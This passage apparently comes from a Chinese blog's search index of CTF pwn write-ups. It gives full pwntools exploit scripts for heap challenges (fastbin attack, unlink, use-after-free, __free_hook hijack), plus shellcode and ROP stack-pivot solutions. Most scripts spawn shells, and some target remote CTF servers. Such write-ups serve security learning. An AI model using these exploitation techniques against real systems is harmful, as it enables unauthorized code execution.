    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(&amp;quot;content:&amp;quot;,c)

def show(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;idx?&amp;quot;,str(n))


add(0x18,b&amp;quot;qqq&amp;quot;) #0
add(0x40,b&amp;quot;www&amp;quot;) #1
add(0x60,b&amp;quot;eee&amp;quot;) #2
add(0x10,b&amp;quot;sss&amp;quot;) #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b&amp;quot;wqw&amp;quot;)
show(2)

leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
realloc=libc_addr+libc.sym[b&amp;quot;__libc_realloc&amp;quot;]
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
# one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[1]+libc_addr

add(0x60,b&amp;quot;wwwee&amp;quot;) #4 2
delete(4)

payload=p64(malloc_hook-0x23)
edit(2,payload) 
add(0x60,b&amp;quot;mmm&amp;quot;) #4


payload=cyclic(0xb)+p64(shell)+p64(realloc+0xc)
add(0x60,payload) #5

gdb.attach(io)
pause()

# add(0x30,b&amp;quot;aaa&amp;quot;)
io.sendlineafter(&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(&amp;quot;size?&amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()


# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

&lt;/code&gt;&lt;/pre&gt;
">V&N2020_simpleheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/J0ICAuGrD/"" data-c="
          &lt;p&gt;一道64位unlink模板练习题，标准菜单，没有uaf，没有堆溢出，但edit没有检查&lt;br&gt;
先放exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



# io=process(&amp;quot;./[SUCTF 2018 招新赛]unlink&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28457)
elf=ELF(&amp;quot;./[SUCTF 2018 招新赛]unlink&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

bss_addr=0x6020C0
free_got=elf.got[b&amp;quot;free&amp;quot;]

def add(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;size : \n&amp;quot;)
    io.sendline(str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;delete\n&amp;quot;)
    io.sendline(str(n))

def show(n):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;show\n&amp;quot;)
    io.sendline(str(n))

def edit(n,cc):
    io.sendlineafter(b&amp;quot;chooice :\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;modify :&amp;quot;)
    io.sendline(str(n))
    io.recvuntil(b&amp;quot;content\n&amp;quot;)
    io.send(cc)


add(0x30) #0
add(0x80) #1
add(0x40) #2


fd=bss_addr-0x18
bk=bss_addr-0x10
payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,payload)

# gdb.attach(io)
# pause()

delete(1) # 0&amp;lt;-1 unsorted bin 
edit(0,p64(0)*3+p64(free_got))
show(0)

libc_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;free&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))


sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,p64(sys_addr))
edit(2,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(2)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此题首先申请3个堆块，前两个堆块构造fake_chunk，然后free掉chunk 1使chunk0和1合并进入unsorted bin，在使用edit将chunk的指针修改为free_got地址，接着show(0)泄露free地址来计算libc基址，最后修改free_got表地址为system地址，edit一块堆块为&amp;quot;/bin/sh\x00&amp;quot;，最后free掉该堆块即可getshell&lt;/p&gt;
">[SUCTF 2018 招新赛]unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/DwLogOagh/"" data-c="
          &lt;p&gt;64位标准菜单题，无uaf，开启canary和nx保护，存在堆溢出&lt;br&gt;
此题第一次尝试用fastbin attack打，劫持__malloc_hook打one_gadget&lt;br&gt;
&lt;s&gt;但实践过程中one_gadget出锅，还是放下不完全的exp&lt;/s&gt;其实是fastbin attack写错了，相信细心的你一定能找出我当时的错误：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29708)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]


def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

# add(0x40,b&amp;quot;asd&amp;quot;) #0
add(0x10,b&amp;quot;cqb&amp;quot;) #0
add(0x40,b&amp;quot;opo&amp;quot;) #1
add(0x30,b&amp;quot;unun&amp;quot;) #2
add(0x10,b&amp;quot;iii&amp;quot;) #3

payload=cyclic(0x10)+p64(0)+p64(0x91)
edit(0,len(payload),payload)

delete(1)
add(0x40,b&amp;quot;aaa&amp;quot;) #1
show()
leak_addr=u64(io.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=libc_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
print(&amp;quot;malloc_hook:  &amp;quot;+hex(malloc_hook))
print(&amp;quot;free_hook:  &amp;quot;+hex(free_hook))
shell=libc_addr+one_gadget[0]


gdb.attach(io)
pause()
add(0x30,b&amp;quot;ppp&amp;quot;) #4
add(0x60,b&amp;quot;www&amp;quot;) #5
add(0x40,b&amp;quot;qqq&amp;quot;) #6
delete(5)



payload=cyclic(0x10)+p64(0)+p64(0x71)+p64(malloc_hook-0x23)
edit(3,len(payload),payload)

add(0x60,p64(shell)) #5
add(0x60,cyclic(0x13)+p64(shell)) #fake_chunk
add(0x40,b&amp;quot;aaa&amp;quot;)


io.interactive()


# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;打不通换unlink做法&lt;br&gt;
先放exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])



io=process(&amp;quot;./bamboobox&amp;quot;)
# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27423)
elf=ELF(&amp;quot;./bamboobox&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]
bss_addr=0x6020C8
# pf_got=elf.got[b&amp;quot;printf&amp;quot;]
atoi_got=elf.got[b&amp;quot;atoi&amp;quot;]
free_got=elf.got[b&amp;quot;free&amp;quot;]

def show():
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;1&amp;quot;)

def add(n,c):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;name:&amp;quot;,str(n))
    io.sendafter(&amp;quot;item:&amp;quot;,c)

def edit(n,c,cc):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))
    io.sendafter(&amp;quot;name:&amp;quot;,str(c))
    io.sendafter(&amp;quot;item:&amp;quot;,cc)

def delete(n):
    io.sendlineafter(&amp;quot;Your choice:&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(&amp;quot;item:&amp;quot;,str(n))

add(0x30,b&amp;quot;aaa&amp;quot;) 
add(0x80,b&amp;quot;qqq&amp;quot;)
add(0x40,b&amp;quot;www&amp;quot;)

payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)



edit(0,len(payload),payload)

delete(1)


payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
gdb.attach(io)
pause()
show()
io.recvuntil(&amp;quot;0 : &amp;quot;)
libc_base=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;atoi&amp;quot;]
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))


sys_addr=libc_base+libc.sym[b&amp;quot;system&amp;quot;]
edit(0,8,p64(sys_addr))
io.sendafter(&amp;quot;choice:&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;首先申请3个堆块，利用edit(0)通过chunk0伪造一个fake_chunk,注意unlink的检查机制，chunk1的size和prev_size（即fake_chunk size）不能错，此外注意chunk1的大小需大于fastbin最大值，方便后来delete(1)时和fake_chunk合并触发unlink操作&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)

edit(0,len(payload),payload)

delete(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;之后fake_chunk的fd指针指向了chunk指针-0x18处&lt;br&gt;
再次通过edit修改chunk指针处的地址为atoi_got（调用过的函数got地址都可以，不过采用atoi方便最后传参）,方便show()时泄露libc&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后将atoi的got表地址改为system地址，此时调用atoi读入参数时同时调用了system，参数传入system，若传入&amp;quot;sh&amp;quot;则可以getshell&lt;/p&gt;
">hitcontraining_unlink wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xswnbOk4E/"" data-c="
          &lt;p&gt;64位开启canary和nx保护，标准菜单配置，存在uaf漏洞，且edit时不检查当前chunk是否为空&lt;br&gt;
最开始思路利用double free改任意地址写，但是add有限制，下标不超过3，最多创建4个chunk；&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680084324971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只好利用uaf漏洞，先创建chunk0释放后edit修改fd指针，在分配两次chunk到fd指针指向栈上的fake_chunk，此时edit(2)即可更改该fake_chunk处的内容&lt;br&gt;
将0x608090处的1改为0即可getshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680085251262.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28201)
elf=ELF(&amp;quot;./[WUSTCTF 2020]easyfast&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

shell=0x4008ab
key_ptr=0x602080

def alloc(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size&amp;gt;\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))

def edit(n,c,cc):
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index&amp;gt;\n&amp;quot;, str(n))
    io.send(cc)

def shell():
    io.sendlineafter(b&amp;quot;choice&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)


alloc(0x40) #0
delete(0)
payload=p64(key_ptr)

gdb.attach(io)
pause()

edit(0,len(payload),payload)
alloc(0x40) #1
alloc(0x40) #2
payload=p64(0)
edit(2,len(payload),p64(0))


# alloc(0x40) #0
# alloc(0x40) #1
# delete(0)
# delete(1) #main_arena-&amp;gt;0-&amp;gt;1-&amp;gt;0
# delete(0)

# gdb.attach(io)
# pause()

# alloc(0x40) #2
# alloc(0x40) #3

# payload=p64(key_ptr)
# edit(1,len(payload),payload)

# alloc(0x40) #4
# alloc(0x40) #5

shell()
# delete(1)
# alloc(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[WUSTCTF 2020]easyfast wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/C4txIB5QN/"" data-c="
          &lt;p&gt;64位堆溢出题目，保护全开，本题用到chunk extend以及__free_hook劫持&lt;br&gt;
menu存在4个函数，其中add函数中一次malloc两个堆块&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002145102.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
第一个堆块是description，第二个堆块才是real content存放处&lt;br&gt;
而本体堆块结构体中存放puts的实际地址，可以以此泄露地址计算libc基址&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002246302.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
下面是exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=process(&amp;quot;./ezheap&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28232)
elf=ELF(&amp;quot;./ezheap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)


def add(n,s,c,cc):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;1&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.recvuntil(b&amp;quot;Name: \n&amp;quot;)
    io.send(c)
    io.recvuntil(b&amp;quot;Content:\n&amp;quot;)
    io.send(cc)

def delete(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;2&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def show(n):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;3&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))

def edit(n,s,c):
    io.recvuntil(&amp;quot;Choice: \n&amp;quot;)
    io.send(b&amp;quot;4&amp;quot;)
    io.recvuntil(&amp;quot;Input your idx:\n&amp;quot;)
    io.send(str(n))
    io.recvuntil(b&amp;quot;Size:\n&amp;quot;)
    io.send(str(s))
    io.send(c)

add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
# add(2,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;)

gdb.attach(io)
pause()

edit(0,0x70,cyclic(0x70))  #0x70bytes到puts的内存地址

show(0) #overlapped chunk 0

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]

print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

payload=cyclic(0x40)+p64(0)+p64(0x31)+p64(0)*2+p64(free_hook-8)
edit(0,len(payload),payload)
payload=b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr)
edit(1,len(payload),payload)
delete(1)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先分配两块符合fastbin大小的堆块，通过edit函数堆溢出至puts地址处&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;add(0,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #0
add(1,0x40,b&amp;quot;asd&amp;quot;,b&amp;quot;asd&amp;quot;) #1
edit(0,0x70,cyclic(0x70)) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1680002436746.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
获取libc后考虑劫持__free_hook到system函数处&lt;br&gt;
于是再次使用堆溢出将之前申请的堆块1的description块处的偏移为0x10处地址覆盖为(&amp;amp;__free_hook-0x8)，将description末尾（即偏移为0x18处）标志位赋值为1，以便能够被free掉，如下判断&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1680002947889.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
之后edit(1)时可以直接从此处开始覆盖，并且&amp;amp;__free_hook-0x8处覆盖为&lt;code&gt;/bin/sh\x00&lt;/code&gt;，&amp;amp;__free_hook处覆盖为system地址，最后free(1)时便可以getshell&lt;/p&gt;
">[HNCTF 2022 WEEK4]ezheap wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/xiJWhqm91/"" data-c="
          &lt;h4 id=&#34;shellcode&#34;&gt;shellcode&lt;/h4&gt;
&lt;p&gt;64位shellcode题目&lt;br&gt;
使用read读入，并用strncpy将读入数据复制到bss段上一处偏移处，随后执行该bss地址加上100以内随机数的偏移的地址处指令(此题随机数无效，可以直接执行bss偏移处)&lt;br&gt;
exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


while True:
    try:
        # io=process(&amp;quot;./pwn&amp;quot;)
        io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,33905)
        io.recvuntil(b&amp;quot;5 min!\n&amp;quot;)
        shellcode=asm(shellcraft.sh())
        payload=cyclic(84)+shellcode.ljust(36,b&amp;quot;a&amp;quot;)+p64(0x4040d4)
        # gdb.attach(io)
        # pause()

        io.send(payload)

        io.interactive()

    except:
        io.close()
        continue
        
        

# pwn部分题目的临时静态平台
# ctf.comentropy.cn
# comentropy.cn
# 8301 8302 8303 8304
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;story&#34;&gt;story&lt;/h4&gt;
&lt;p&gt;64位栈迁移&lt;br&gt;
menu存在4个函数，前三个函数向bss段分别写入8bytes&lt;br&gt;
第四个函数在前三个函数都被调用后执行，通过read()读入0x20bytes&lt;br&gt;
前三次随便读入，此题可以通过第四次函数执行时进行两次栈迁移之后劫持rsp寄存器然后构建ROP链泄露libc返回构造或者one_gadget求解&lt;br&gt;
栈迁移后由于read长度限制0x20，所以需要小心构建ROP链&lt;br&gt;
另外注意一点，此题需留意&lt;a href=&#34;http://blog.binpang.me/2019/07/12/stack-alignment/&#34;&gt;十六字节对齐&lt;/a&gt;的问题，如果最后卡住了不妨修改一下bss的初始地址（卡了2h的锅&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./story&amp;quot;)
io=remote(&amp;quot;node.yuzhian.com.cn&amp;quot;,35198)
elf=ELF(&amp;quot;./story&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
heart=0x40136f
ret=0x40101a
bss_addr=0x4050A8+0x700
pop_rdi_ret=0x401573
read_text=0x401387
leave_ret=0x40139e
one_gadget=[0xe3afe,0xe3b01,0xe3b04]

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;comment?\n&amp;quot;)
# payload=p64(read_text)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.recvuntil(b&amp;quot;corment?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
io.recvuntil(b&amp;quot;corMenT?\n&amp;quot;)
io.sendline(b&amp;quot;asd&amp;quot;)

io.recvuntil(b&amp;quot;&amp;gt; \n&amp;quot;)
io.sendline(b&amp;quot;4&amp;quot;)
io.recvuntil(b&amp;quot;heart...\n&amp;quot;)




payload=cyclic(0xA)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x8)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(heart)
io.send(payload)

libc_base=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x084420
sys_addr=libc_base+0x052290
str_bin_sh=libc_base+0x1b45bd
print(&amp;quot;libc_base:  &amp;quot;+hex(libc_base))

shell=one_gadget[0]+libc_base
print(&amp;quot;shell:  &amp;quot;+hex(shell))


# gdb.attach(io)
# pause()

# payload=cyclic(0x12)+p64(shell)
# # payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
# io.send(payload)

io.recvuntil(b&amp;quot;heart...\n&amp;quot;)

payload=cyclic(0xA)+p64(bss_addr+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0xA)+p64(bss_addr+0xA+0x200)+p64(read_text)
payload=payload.ljust(0x20,b&amp;quot;a&amp;quot;)
io.send(payload)



payload=p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.send(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040139e : leave ; ret
# 0x000000000040156c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401570 : pop r14 ; pop r15 ; ret
# 0x0000000000401572 : pop r15 ; ret
# 0x000000000040156b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040156f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040118d : pop rbp ; ret
# 0x0000000000401573 : pop rdi ; ret
# 0x0000000000401571 : pop rsi ; pop r15 ; ret
# 0x000000000040156d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">NKCTF_2023 pwn部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/9c1-_YzDp/"" data-c="
          &lt;p&gt;静态编译题目，0x50到ret&lt;br&gt;
针对输入数据异或0x66，再异或一次复原&lt;br&gt;
ropchain一把梭&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from struct import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./p8&amp;quot;)
io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28093)

io.recvuntil(b&amp;quot;Password: \n&amp;quot;)
def rop():
    p = b&#39;&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
    p += b&#39;/bin//sh&#39;
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
    p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
    p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
